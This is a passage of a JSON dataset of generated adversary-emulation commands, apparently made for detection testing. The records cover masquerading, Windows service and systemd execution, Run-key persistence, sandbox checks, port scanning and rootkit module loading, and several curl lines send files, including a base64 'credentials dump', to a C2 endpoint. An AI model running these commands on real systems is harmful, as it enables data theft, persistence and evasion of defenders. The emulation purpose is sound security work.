      "command": "sc.exe create TestService binPath= \"C:\\Windows\\System32\\cmd.exe /c echo 'Test Service' > %TEMP%\\test.txt\"",
      "description": "Create a new service using sc.exe, potentially masquerading as a legitimate system service.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a new service that, when started, executes a command that writes to a file in the temporary directory, demonstrating how services can be used to masquerade malicious activity.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:19.089167",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "11e61429-62e5-42e6-82a2-6d48aec1ff48",
      "ttp_id": "af1e7ebb-f91a-40ee-862c-bea50e7d00ee",
      "technique_id": "af1e7ebb-f91a-40ee-862c-bea50e7d00ee",
      "technique_name": "Masquerading",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "cp /bin/sh /tmp/systemd-update; /tmp/systemd-update -c 'echo \"Simulated update check\"'",
      "description": "Copy shell to a filename resembling a legitimate system update binary",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a copy of sh named 'systemd-update' in /tmp and executes it with a benign command, simulating a system update process",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.951121",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "0c94d2c0-94b3-4db6-b9c1-823071ead123",
      "ttp_id": "af1e7ebb-f91a-40ee-862c-bea50e7d00ee",
      "technique_id": "af1e7ebb-f91a-40ee-862c-bea50e7d00ee",
      "technique_name": "Masquerading",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo '#!/bin/sh\\necho \"Configuration check complete\"' > /tmp/.configcache; chmod +x /tmp/.configcache; /tmp/.configcache",
      "description": "Create an executable script with a name and location mimicking a hidden config file",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Generates a hidden script named '.configcache' in /tmp, makes it executable, and runs it to output a fake configuration message",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.951121",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "dff31cd8-4406-4b61-a61e-66c5c0c4f7ff",
      "ttp_id": "af1e7ebb-f91a-40ee-862c-bea50e7d00ee",
      "technique_id": "af1e7ebb-f91a-40ee-862c-bea50e7d00ee",
      "technique_name": "Masquerading",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "mkdir -p $HOME/.local/bin; cp /bin/ls $HOME/.local/bin/openssl; chmod +x $HOME/.local/bin/openssl; $HOME/.local/bin/openssl -la /tmp",
      "description": "Place a disguised binary named 'openssl' in a user-local path to mimic a legitimate security tool",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Copies 'ls' to a file named 'openssl' in a user's local bin directory, sets execute permissions, and runs it to list /tmp contents, masquerading as OpenSSL execution",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.951121",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "f9d2552e-3270-4062-8b9c-7431c03e4d03",
      "ttp_id": "933453dc-5dba-4b4f-b241-eea9fa4ef3a0",
      "technique_id": "933453dc-5dba-4b4f-b241-eea9fa4ef3a0",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "echo 'test_data_for_exfil' > $HOME/test_exfil.txt && curl -X POST http://192.168.0.10:8080/exfil --data-binary @$HOME/test_exfil.txt",
      "description": "Basic exfiltration: creates a test file and uploads it via HTTP POST using curl",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A file named test_exfil.txt is created in the user's home directory and sent to the specified C2 server via HTTP POST. The server should receive the file contents.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:48:31.571687",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.699,
      "validated": true
    },
    {
      "id": "ee56c8b2-f8ac-4973-943d-73fce230c5b7",
      "ttp_id": "933453dc-5dba-4b4f-b241-eea9fa4ef3a0",
      "technique_id": "933453dc-5dba-4b4f-b241-eea9fa4ef3a0",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "mkdir -p $TMP/exfil_data && echo 'sensitive_log_data' > $TMP/exfil_data/app.log && tar -czf $TMP/data.tar.gz -C $TMP/exfil_data . && curl -X PUT http://192.168.0.10:8080/upload --data-binary @$TMP/data.tar.gz",
      "description": "Intermediate exfiltration: creates log-like data, compresses it into a tarball, and uploads via HTTP PUT",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A directory with a fake log file is created, compressed into data.tar.gz, and uploaded to the C2 server. The archive contains the simulated sensitive data.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:48:31.571687",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.699,
      "validated": true
    },
    {
      "id": "018d8ac8-169d-4454-ba4b-567a6410f746",
      "ttp_id": "933453dc-5dba-4b4f-b241-eea9fa4ef3a0",
      "technique_id": "933453dc-5dba-4b4f-b241-eea9fa4ef3a0",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "echo 'confidential_credentials_dump' > $TMP/creds.txt && base64 $TMP/creds.txt > $TMP/encoded_data.b64 && curl -s -X POST http://192.168.0.10:8080/api/submit -d \"data=$(cat $TMP/encoded_data.b64)\" --header \"Content-Type: application/x-www-form-urlencoded\"",
      "description": "Advanced exfiltration: encodes data in base64 and sends it in POST body as form data to mimic credential exfiltration",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A test credential file is created, base64-encoded, and embedded in a URL-encoded POST request sent to the C2 endpoint. Simulates obfuscated exfiltration over C2.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:48:31.571687",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.699,
      "validated": true
    },
    {
      "id": "7e5c9409-4d19-4f9b-a6b7-b11801eabcc9",
      "ttp_id": "5ab87126-8015-43ab-8994-cb6361447eff",
      "technique_id": "5ab87126-8015-43ab-8994-cb6361447eff",
      "technique_name": "Obtain Capabilities: Code Signing Certificates",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo '#!/bin/bash\\necho \\\"Hello from signed script\\\"' > $TMP/unsigned_script.sh && chmod +x $TMP/unsigned_script.sh && gpg --detach-sign --output $TMP/unsigned_script.sh.sig $TMP/unsigned_script.sh",
      "description": "Creates a benign script and signs it using GPG to simulate code signing with obtained credentials.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Generates a simple executable script and a detached GPG signature. Requires a configured GPG keyring; otherwise, may prompt for key.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:51:10.793574",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.699,
      "validated": true
    },
    {
      "id": "691ce8fa-3594-461f-87f5-19173a9cb544",
      "ttp_id": "5ab87126-8015-43ab-8994-cb6361447eff",
      "technique_id": "5ab87126-8015-43ab-8994-cb6361447eff",
      "technique_name": "Obtain Capabilities: Code Signing Certificates",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "TMP_DIR=$(mktemp -d) && echo 'console.log(\\\"test payload\\\");' > \"$TMP_DIR/test.js\" && cat > \"$TMP_DIR/sign.js\" << 'EOF'\\nconst crypto = require('crypto');\\nconst fs = require('fs');\\nconst cert = fs.readFileSync('$HOME/.testcert/test.crt');\\nconst key = fs.readFileSync('$HOME/.testcert/test.key');\\nconst data = fs.readFileSync('$TMP_DIR/test.js');\\nconst sign = crypto.createSign('sha256');\\nsign.write(data);\\nsign.end();\\nconst signature = sign.sign(key, 'base64');\\nfs.writeFileSync('$TMP_DIR/test.js.sig', signature);\\nEOF\\nnode \"$TMP_DIR/sign.js\"",
      "description": "Uses Node.js to simulate signing a JavaScript file with a previously generated certificate, representing advanced use of obtained signing capabilities.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a temporary directory, writes a test script and a signing script, then uses Node.js to generate a cryptographic signature using the test certificate and key.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:51:10.793574",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.699,
      "validated": true
    },
    {
      "id": "041451d2-0072-431b-a594-cda4ea3b3398",
      "ttp_id": "fdc319c5-72d2-4aaf-9e1c-5a3f505562bd",
      "technique_id": "fdc319c5-72d2-4aaf-9e1c-5a3f505562bd",
      "technique_name": "System Services: Service Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "sc.exe create TestService binPath= \"cmd.exe /c echo Service started > %TEMP%\\service_test.txt\" start= auto && sc.exe start TestService",
      "description": "Creates a Windows service named 'TestService' that writes a message to a file in %TEMP% when started, then starts the service using sc.exe.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A service named 'TestService' is created and started. Upon execution, it writes 'Service started' to %TEMP%\\service_test.txt. Requires administrator privileges to create and start the service.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:47.275873",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.696,
      "validated": true
    },
    {
      "id": "f575ab1f-2617-4931-afcc-f21be3a14a8f",
      "ttp_id": "fdc319c5-72d2-4aaf-9e1c-5a3f505562bd",
      "technique_id": "fdc319c5-72d2-4aaf-9e1c-5a3f505562bd",
      "technique_name": "System Services: Service Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"& sc.exe create IntermediateSvc binPath= 'cmd.exe /c calc.exe' start= demand; & sc.exe start IntermediateSvc; Start-Sleep 2; & sc.exe delete IntermediateSvc -ErrorAction SilentlyContinue\"",
      "description": "Creates a temporary service using sc.exe via PowerShell that launches calc.exe, starts it manually, and deletes the service afterward.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The Windows Calculator (calc.exe) is launched under the context of a newly created service. The service is deleted after execution. calc.exe is benign and used for demonstration. Admin rights are required for service creation and deletion.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:47.275873",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.696,
      "validated": true
    },
    {
      "id": "2f6a77c4-499d-4845-b3ba-ccebdcf4db94",
      "ttp_id": "fdc319c5-72d2-4aaf-9e1c-5a3f505562bd",
      "technique_id": "fdc319c5-72d2-4aaf-9e1c-5a3f505562bd",
      "technique_name": "System Services: Service Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"$cmd = 'cmd.exe /c echo Advanced service execution > %TEMP%\\adv_service.log'; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)); $svcName = 'AdvMalService'; & sc.exe create $svcName binPath= 'powershell.exe -EncodedCommand ' + $encoded start= auto; & sc.exe start $svcName; & sc.exe delete $svcName -ErrorAction SilentlyContinue\"",
      "description": "Creates a service that executes a Base64-encoded PowerShell command to write a message to a log file, simulating obfuscated execution, then starts and deletes the service.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A service named 'AdvMalService' is created with a Base64-encoded command that writes to %TEMP%\\adv_service.log. The service is started and then deleted. The encoding simulates real-world obfuscation. Requires admin rights. The action is non-destructive but uses encoded commands, increasing detection relevance.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:47.275873",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.696,
      "validated": true
    },
    {
      "id": "b165de6c-7607-402a-a9f9-26c908e33c5b",
      "ttp_id": "fdc319c5-72d2-4aaf-9e1c-5a3f505562bd",
      "technique_id": "fdc319c5-72d2-4aaf-9e1c-5a3f505562bd",
      "technique_name": "System Services: Service Execution",
      "tactic": "Execution",
      "platform": "linux",
      "command": "sudo systemctl start ssh",
      "description": "Basic service execution: Start an existing system service (SSH) to simulate benign service execution.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Starts the SSH service if it is installed and available. No payload execution, just standard service activation.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:40:56.022420",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.696,
      "validated": true
    },
    {
      "id": "f5105bbc-865b-4300-8c57-f66943ba2d31",
      "ttp_id": "fdc319c5-72d2-4aaf-9e1c-5a3f505562bd",
      "technique_id": "fdc319c5-72d2-4aaf-9e1c-5a3f505562bd",
      "technique_name": "System Services: Service Execution",
      "tactic": "Execution",
      "platform": "linux",
      "command": "echo '[Unit]\\nDescription=Test Service\\n[Service]\\nExecStart=/bin/sh -c \"echo 'Hello from test service' > /tmp/test_service.log\"\\n[Install]\\nWantedBy=multi-user.target' | sudo tee /etc/systemd/system/test-service.service && sudo systemctl daemon-reload && sudo systemctl enable --now test-service.service",
      "description": "Intermediate: Create a custom systemd service that logs a message, then enable and start it.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a systemd unit file in /etc/systemd/system, reloads the daemon, enables the service, and starts it. Logs a test message to /tmp/test_service.log.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:40:56.022420",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.696,
      "validated": true
    },
    {
      "id": "bff8ef6c-af57-467f-b115-3b36c2bba07b",
      "ttp_id": "fdc319c5-72d2-4aaf-9e1c-5a3f505562bd",
      "technique_id": "fdc319c5-72d2-4aaf-9e1c-5a3f505562bd",
      "technique_name": "System Services: Service Execution",
      "tactic": "Execution",
      "platform": "linux",
      "command": "printf '#!/bin/bash\\necho \\\"Malicious command simulation\\\"' > $HOME/malicious.sh && chmod +x $HOME/malicious.sh && echo '[Unit]\\nDescription=Malicious Simulation\\n[Service]\\nType=oneshot\\nExecStart=/bin/sh -c \\\"$HOME/malicious.sh\\\"\\nRemainAfterExit=yes\\n[Install]\\nWantedBy=default.target' | sudo tee /etc/systemd/system/malicious-sim.service && sudo systemctl daemon-reload && sudo systemctl start malicious-sim.service",
      "description": "Advanced: Simulate execution of a malicious script via a dynamically created systemd service unit.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a local script that prints a benign test message, then creates a systemd service to execute it. The service is started once. No persistence is enabled, but the service file remains until manually removed.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:40:56.022420",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.696,
      "validated": true
    },
    {
      "id": "46165c79-f332-487e-a35c-013e3cfd91ba",
      "ttp_id": "976cd85c-7bb8-4059-abff-febf170f8041",
      "technique_id": "976cd85c-7bb8-4059-abff-febf170f8041",
      "technique_name": "Modify Registry",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "reg add \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v \"TestHideKey\" /t REG_SZ /d \"cmd.exe /c echo hidden\" /f",
      "description": "Adds a registry persistence key with a test command using reg.exe",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Adds a new value 'TestHideKey' to the current user's Run key pointing to a harmless command. This simulates a persistence mechanism that could be hidden by a rootkit.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.472320",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.695,
      "validated": true
    },
    {
      "id": "17c59470-b881-4f4d-9423-636c7ac193a1",
      "ttp_id": "976cd85c-7bb8-4059-abff-febf170f8041",
      "technique_id": "976cd85c-7bb8-4059-abff-febf170f8041",
      "technique_name": "Modify Registry",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "reg add \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\" /v \"HideTestKey\" /t REG_DWORD /d 1 /f",
      "description": "Modifies system policy registry to simulate a hidden key (benign flag)",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a test DWORD value in the System Policies key. Requires admin due to HKLM write. Simulates modification of a protected registry location that might be hidden from view by a rootkit.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.472826",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.695,
      "validated": true
    },
    {
      "id": "23cfa1a3-096e-4fc4-8142-47a62cdd616e",
      "ttp_id": "976cd85c-7bb8-4059-abff-febf170f8041",
      "technique_id": "976cd85c-7bb8-4059-abff-febf170f8041",
      "technique_name": "Modify Registry",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '$env:TEMP\\\\HiddenRegTest' -ErrorAction SilentlyContinue; $path = '$env:TEMP\\\\HiddenRegTest\\\\regdata.txt'; reg export \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" $path -y -ErrorAction SilentlyContinue; if (Test-Path $path) { (Get-Content $path) -replace 'TestHideKey', 'HiddenKeyValue' | Set-Content $path -Force }\"",
      "description": "Exports current user Run keys, simulates hiding a key by removing it from view in a backup file",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Exports the Run key to a file in TEMP, then modifies the exported data to remove or rename the test key, simulating how a rootkit might hide keys from registry editors or export tools.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.472826",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.695,
      "validated": true
    },
    {
      "id": "2c89f204-6634-428c-aa66-baedccfa11de",
      "ttp_id": "3c688e21-c8bd-4501-b05a-0c69d768d2ad",
      "technique_id": "3c688e21-c8bd-4501-b05a-0c69d768d2ad",
      "technique_name": "Virtualization/Sandbox Evasion",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "start cmd.exe /c echo \"Test String\" > %TEMP%\\test.txt",
      "description": "Basic: Create a new process using 'start' command and write to a file in the temp directory",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A new file named 'test.txt' is created in the temp directory with the content 'Test String'",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:38.916333",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.692,
      "validated": true
    },
    {
      "id": "d8f0271b-e68d-4467-b21f-160798abc6f6",
      "ttp_id": "3c688e21-c8bd-4501-b05a-0c69d768d2ad",
      "technique_id": "3c688e21-c8bd-4501-b05a-0c69d768d2ad",
      "technique_name": "Virtualization/Sandbox Evasion",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "sc.exe create TestService binPath= \"C:\\Windows\\System32\\cmd.exe /c echo Test String > %TEMP%\\test2.txt\"",
      "description": "Intermediate: Create a new service using 'sc.exe' that writes to a file in the temp directory when started",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new service named 'TestService' is created, and when started, it creates a new file named 'test2.txt' in the temp directory with the content 'Test String'",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:38.916711",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.692,
      "validated": true
    },
    {
      "id": "ef3f2555-241d-4837-8f4d-6403da0abf14",
      "ttp_id": "3c688e21-c8bd-4501-b05a-0c69d768d2ad",
      "technique_id": "3c688e21-c8bd-4501-b05a-0c69d768d2ad",
      "technique_name": "Virtualization/Sandbox Evasion",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process cmd.exe -ArgumentList '/c echo Test String > %TEMP%\\test3.txt' -NoNewWindow\"",
      "description": "Advanced: Use PowerShell to start a new process with specific arguments, attempting to bypass sandbox restrictions",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A new process is started, and a new file named 'test3.txt' is created in the temp directory with the content 'Test String'",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:38.916711",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.692,
      "validated": true
    },
    {
      "id": "7c59a15a-1996-4515-8091-034ca7871d3e",
      "ttp_id": "3c688e21-c8bd-4501-b05a-0c69d768d2ad",
      "technique_id": "3c688e21-c8bd-4501-b05a-0c69d768d2ad",
      "technique_name": "Virtualization/Sandbox Evasion",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "cat /proc/cpuinfo | grep -i virtual",
      "description": "Check for virtualization indicators in CPU info",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Output will indicate if virtualization is detected based on CPU info",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.897607",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.692,
      "validated": true
    },
    {
      "id": "7f016649-2b7f-4b19-a384-3f97ee6de66b",
      "ttp_id": "3c688e21-c8bd-4501-b05a-0c69d768d2ad",
      "technique_id": "3c688e21-c8bd-4501-b05a-0c69d768d2ad",
      "technique_name": "Virtualization/Sandbox Evasion",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "ps -ef | grep -v grep | grep sandbox",
      "description": "Look for sandbox processes",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "List processes that might indicate a sandbox environment",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.897607",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.692,
      "validated": true
    },
    {
      "id": "39f7708b-84ef-4b43-93fd-6de0e465e2ee",
      "ttp_id": "3c688e21-c8bd-4501-b05a-0c69d768d2ad",
      "technique_id": "3c688e21-c8bd-4501-b05a-0c69d768d2ad",
      "technique_name": "Virtualization/Sandbox Evasion",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "uname -a && ls /dev/vbox* 2>/dev/null",
      "description": "Check for VirtualBox indicators",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Output will show system information and check for VirtualBox device files",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.897607",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.692,
      "validated": true
    },
    {
      "id": "9d706a01-e110-4551-bc5c-38ed903fc2f6",
      "ttp_id": "e443ed87-0aed-487e-81cb-e472dede450e",
      "technique_id": "e443ed87-0aed-487e-81cb-e472dede450e",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "ping -n 1 192.168.1.1",
      "description": "Basic ICMP ping sweep to detect active host on local network",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Sends one ICMP echo request to 192.168.1.1 and displays response if host is reachable; minimal network noise",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.560809",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "de291c50-4a2e-4256-8a62-ecad3be9d2e5",
      "ttp_id": "e443ed87-0aed-487e-81cb-e472dede450e",
      "technique_id": "e443ed87-0aed-487e-81cb-e472dede450e",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "cmd.exe /c \"for /L %i in (1,1,5) do @ping -n 1 192.168.1.%i | findstr \"Reply\"\"",
      "description": "Intermediate batch command to perform limited ping sweep across first five IPs in 192.168.1.x subnet",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Loops through IPs 192.168.1.1 to 192.168.1.5, pinging each once and only printing lines with 'Reply' to indicate live hosts",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.560809",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "78e33980-7401-4ad5-8913-216252a38e0f",
      "ttp_id": "e443ed87-0aed-487e-81cb-e472dede450e",
      "technique_id": "e443ed87-0aed-487e-81cb-e472dede450e",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"1..10 | ForEach-Object { $addr = '192.168.1.' + $_; $socket = New-Object System.Net.Sockets.TcpClient; $conn = $socket.BeginConnect($addr, 445, $null, $null); Start-Sleep -Milliseconds 150; if ($conn.IsCompleted) { $socket.EndConnect($conn); Write-Output \"Port 445 open on $addr\" } else { $socket.Close() } }\"",
      "description": "Advanced PowerShell-based TCP port scanning for port 445 (SMB) across 10 hosts in local subnet",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts TCP connection to port 445 on IPs 192.168.1.1 through 192.168.1.10; outputs success message only for open ports; uses built-in .NET classes via New-Object which is allowed, not .NET reflection",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.560809",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "cee6e8d9-ce69-47f1-9a11-d826edde2029",
      "ttp_id": "e443ed87-0aed-487e-81cb-e472dede450e",
      "technique_id": "e443ed87-0aed-487e-81cb-e472dede450e",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "netstat -tuln",
      "description": "List all listening TCP and UDP ports without resolving hostnames or services, simulating basic network service discovery.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a list of active listening ports and associated protocols. This is a standard reconnaissance step to identify accessible network services.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:45:46.087257",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "5c2d0ddf-d1e1-4652-9e1c-a4852e209873",
      "ttp_id": "e443ed87-0aed-487e-81cb-e472dede450e",
      "technique_id": "e443ed87-0aed-487e-81cb-e472dede450e",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "ss -tulnp",
      "description": "Use the ss tool to display listening sockets with process information, providing more detail than netstat.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Shows all listening TCP and UDP sockets with associated PIDs and process names. Requires root to see process details for all services. Commonly used by attackers to map exposed services and associated binaries.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:45:46.087257",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "5e571438-e29c-42ee-9824-fdf942e94233",
      "ttp_id": "e443ed87-0aed-487e-81cb-e472dede450e",
      "technique_id": "e443ed87-0aed-487e-81cb-e472dede450e",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "lsof -i :22; lsof -i :80; lsof -i :443",
      "description": "Check for processes listening on common service ports (SSH, HTTP, HTTPS) using lsof, which accesses kernel socket information via /proc.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Lists processes using specific network ports. Requires root to access full process and socket details. This simulates targeted service scanning and is representative of post-compromise discovery actions.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:45:46.087257",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "5df3d18a-5cde-4c98-ab9e-5786f43835f9",
      "ttp_id": "678b697b-f519-4251-8aa1-47ac191efa8a",
      "technique_id": "678b697b-f519-4251-8aa1-47ac191efa8a",
      "technique_name": "Hide System Processes",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "sudo insmod /tmp/fake_rootkit.ko process_to_hide=1234",
      "description": "Load a kernel module that hides a process with PID 1234 by unlinking it from the process list",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The kernel module is loaded and hooks the process list; the specified process (PID 1234) no longer appears in /proc or ps output",
      "source": "langchain",
      "generated_at": "2025-12-28T12:51:10.795607",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.685,
      "validated": true
    },
    {
      "id": "de8e111c-35c1-4479-8dbe-f9a5f7b1b656",
      "ttp_id": "678b697b-f519-4251-8aa1-47ac191efa8a",
      "technique_id": "678b697b-f519-4251-8aa1-47ac191efa8a",
      "technique_name": "Hide System Processes",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo 'module fake_rootkit { version \"1.0\"; license \"GPL\"; }' > /dev/null && sudo insmod /tmp/fake_rootkit.ko hide_pid=5678",
      "description": "Simulate loading a rootkit module with parameters to hide a specific process PID",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The command simulates configuration and loading of a kernel module that removes a process from visibility in system process lists",
      "source": "langchain",
      "generated_at": "2025-12-28T12:51:10.795607",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.685,
      "validated": true
    },
    {
      "id": "b688d788-a4f8-4142-9b90-cc30a3808b1a",
      "ttp_id": "678b697b-f519-4251-8aa1-47ac191efa8a",
      "technique_id": "678b697b-f519-4251-8aa1-47ac191efa8a",
      "technique_name": "Hide System Processes",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "sudo mkdir -p /lib/modules/$(uname -r)/extra && sudo cp /tmp/fake_rootkit.ko /lib/modules/$(uname -r)/extra/ && sudo depmod -a && sudo modprobe fake_rootkit hide_pid=9999",
      "description": "Install and load a kernel module using modprobe to hide a process with PID 9999",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The kernel module is installed in the modules tree and loaded via modprobe, activating process hiding for the specified PID",
      "source": "langchain",
      "generated_at": "2025-12-28T12:51:10.795607",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.685,
